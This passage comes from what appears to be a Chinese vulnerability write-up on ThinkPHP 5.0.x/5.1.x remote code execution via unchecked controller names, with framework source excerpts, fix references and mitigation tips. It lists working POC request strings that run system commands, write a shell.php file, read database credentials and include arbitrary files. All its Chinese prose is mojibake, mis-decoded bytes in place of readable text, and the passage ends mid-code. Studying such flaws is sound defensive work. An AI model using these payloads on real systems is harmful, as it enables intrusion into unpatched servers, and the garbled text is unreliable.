md5ï¼Œç„¶åæˆªå–å‰ä¸¤ä½ä½œä¸ºç›®å½•åï¼Œåé¢éƒ¨åˆ†ä½œä¸ºæ–‡ä»¶åç„¶åå’Œ<code>.php</code>åç¼€è¿›è¡Œæ‹¼æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>çœ‹çœ‹setæ–¹æ³•çš„å¤„ç†æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>æœ€åé€šè¿‡<code>file_put_contents</code>å‡½æ•°ï¼Œå°†<code>$data</code>ï¼ˆå‚æ•°å†…å®¹å¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹dataå‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ç­‰æ“ä½œï¼Œåªæ˜¯åºåˆ—åŒ–åæ‹¼æ¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œçš„ <strong>$this-&gt;options[â€˜data_compressâ€™]</strong> å˜é‡é»˜è®¤æƒ…å†µä¸‹ä¸º <strong>false</strong> ï¼Œæ‰€ä»¥æ•°æ®ä¸ä¼šç»è¿‡ <strong>gzcompress</strong> å‡½æ•°å¤„ç†ã€‚è™½ç„¶åœ¨åºåˆ—åŒ–æ•°æ®å‰é¢æ‹¼æ¥äº†å•è¡Œæ³¨é‡Šç¬¦ <strong>//</strong> ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥æ¢è¡Œç¬¦ç»•è¿‡è¯¥é™åˆ¶ã€‚ï¼‰ å†™å…¥<code>$filename</code>ä»è€ŒGetShellã€‚</p><blockquote><p>æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯(ä¹Ÿå°±æ˜¯ä¸Šä¸Šå›¾ä¸­çš„è®¾ç½®æ–‡ä»¶åå‰ç¼€çš„ä»£ç )ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></blockquote><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ï¼Œthinkphp3.2çš„ç‰ˆæœ¬è¯·é€‰æ‹©å¼€å¯ï¼šDATA_CACHE_KEY è¿™æ ·å°±ç®—ä½ ä½¿ç”¨çš„cmsæ˜¯å¼€æºçš„äººå®¶å‘ç°äº†è¿™ä¸ªä¹Ÿæ— æ³•ä½¿ç”¨ã€‚<br>2ï¼Œtp3.2-tp5  åšå¥½ç›®å½•æƒé™ï¼Œé™¤å…¬å…±ç›®å½•ç»å¯¹ä¸è¦è®©å¤–éƒ¨å¯è®¿é—®</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE"><a href="#RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE" class="headerlink" title="RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)"></a>RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)</h1><blockquote><p>æ§åˆ¶å™¨è¿‡æ»¤ä¸ä¸¥ï¼Œç»“åˆç›´æ¥è¿”å›ç±»åçš„ä»£ç æ“ä½œï¼Œå¯¼è‡´å¯ä»¥ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•</p></blockquote><p>è·å–å¤ç°ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹composer.json çš„  require å­—æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š</p><p><strong>æ„Ÿè§‰è‡ªå·±åˆ†æçš„ä¸å¥½ï¼Œè¦å­¦ä¹ è¿˜æ˜¯å»çœ‹å‚è€ƒèµ„æ–™å§ã€‚</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥ä»¥è¿™ä¸ªPOCè¿›è¡Œåˆ†æï¼ŒThinkPHP ç‰ˆæœ¬ä¸º<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p></blockquote><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>ä¸åŒç‰ˆæœ¬çš„Payloadï¼Œéœ€è¦åšç›¸å…³çš„è°ƒæ•´ã€‚</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨5.1.31çš„æ›´æ–°ä¸­ï¼ŒæŸ¥çœ‹ç›¸å…³æ›´æ–°çš„ä¿¡æ¯ï¼Œå…¶ä¸­å…³äº<code>ä¿®æ­£æ§åˆ¶å™¨åè·å–</code> çš„commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>å¦å¤–ï¼Œå®˜æ–¹å¯¹äºæ­¤å¤„æ›´æ–°ï¼Œä¸“é—¨å‘äº†ä¸€æ¬¡å¾®ä¿¡å…¬å‘Šã€‚<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„<code>getshell</code>æ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬<code>5.0</code>å’Œ<code>5.1</code>ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œå¹¶ä¸”å¼€å¯äº†è·¯ç”±å™¨å…¼å®¹æ¨¡å¼ï¼Œ<code>s</code>ã€‚</p><p>5.1.31 ä¿®å¤åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><ul><li>æ§åˆ¶å™¨å</li><li>å¼ºåˆ¶è·¯ç”±</li></ul><p>by ä¸ƒæœˆç«å¸ˆå‚…ï¼š</p><blockquote><p>åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è·¯ç”±å…¼å®¹æ¨¡å¼ <strong>s</strong> å‚æ•°ï¼Œè€Œæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œè¯´æ˜å¯èƒ½å¯ä»¥è°ƒç”¨ä»»æ„çš„æ§åˆ¶å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ç€åˆ©ç”¨ <code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code> æ¥æµ‹è¯•ä¸€ä¸‹ã€‚åœ¨å…ˆå‰çš„ <strong>ThinkPHP SQLæ³¨å…¥</strong> åˆ†ææ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ½æœ‰æåˆ°æ‰€æœ‰ç”¨æˆ·å‚æ•°éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•å¤„ç†ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œ <strong>filterValue</strong> æ–¹æ³•ä¸­ä½¿ç”¨äº† <strong>call_user_func</strong> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚</p><p>æ ¹æ®ä¿®å¤çš„å†…å®¹ï¼šå¯¹æ§åˆ¶å™¨åçš„è·å–ï¼Œç›´æ¥åœ¨è·å–æ§åˆ¶å™¨çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œæ¥è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>å¾—å‡ºï¼šæ§åˆ¶å™¨åæ˜¯é€šè¿‡<code>$result[1]</code> æ¥è·å–çš„ã€‚</p><blockquote><p>è€Œ <strong>$result</strong> çš„å€¼æ¥æºäºå…¼å®¹æ¨¡å¼ä¸‹çš„ <strong>pathinfo</strong> ï¼Œå³ <strong>s</strong> å‚æ•°</p></blockquote><p>ç»§ç»­è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œç¨‹åºä¼šæ¥åˆ°Appç±»ä¸‹çš„<code>run</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>ç»§ç»­è°ƒç”¨<code>Dispatch</code>ç±»çš„<code>run</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>exec</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹è·¯ç”±afterè¡Œä¸º</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•°æ®è‡ªåŠ¨éªŒè¯</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†åå°„æœºåˆ¶ï¼Œè°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œè¿™é‡Œç±»å’Œæ–¹æ³•éƒ½å¯æ§ã€‚</p><p>è¯¥æ–¹æ³•ä¸­ï¼Œ<strong>æœªå¯¹å®ä¾‹åŒ–æ§åˆ¶å™¨å’Œæ“ä½œåè¿›è¡Œä»»ä½•è¿‡æ»¤ã€åˆæ³•æ€§æ£€æµ‹æ“ä½œï¼Œè¿™å°±æ˜¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›´æ¥åŸå› ã€‚</strong></p><hr><p>å¦‚æœç›´æ¥æ‹¿è¯¥ç‰ˆæœ¬çš„ <strong>payload</strong> å»æµ‹è¯• <strong>ThinkPHP5.0.x</strong> ç‰ˆæœ¬ï¼Œä¼šå‘ç°å¾ˆå¤š <strong>payload</strong> éƒ½ä¸èƒ½æˆåŠŸã€‚å…¶åŸå› æ˜¯ä¸¤ä¸ªå¤§ç‰ˆæœ¬å·²åŠ è½½çš„ç±»ä¸åŒï¼Œå¯¼è‡´å¯åˆ©ç”¨çš„ç±»ä¹Ÿä¸å°½ç›¸åŒã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 